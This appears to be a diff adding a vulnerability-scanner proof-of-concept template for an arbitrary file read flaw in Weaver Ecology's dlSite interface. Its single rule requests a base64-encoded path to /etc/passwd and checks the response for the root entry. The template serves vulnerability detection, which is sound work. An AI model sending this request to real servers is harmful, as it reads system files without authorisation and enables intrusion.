@@ -1,0 +1,12 @@
+name: poc-yaml-weaver-ecology-dlsite-fileread
+rules:
+  - method: GET
+    path: "/papi/file/dlSite/localTemp_L2V0Yy9wYXNzd2Q="
+    expression: |
+      response.status == 200 && response.body.bcontains(b"root:x:0:0:")
+detail:
+  author: L4xy
+  description: "泛微ecology dlSite接口任意文件读取漏洞，可通过base64编码文件路径读取服务器任意文件"
+  links:
+    - https://github.com/Threekiii/Vulnerability-Wiki
+  tags: weaver,ecology,fileread
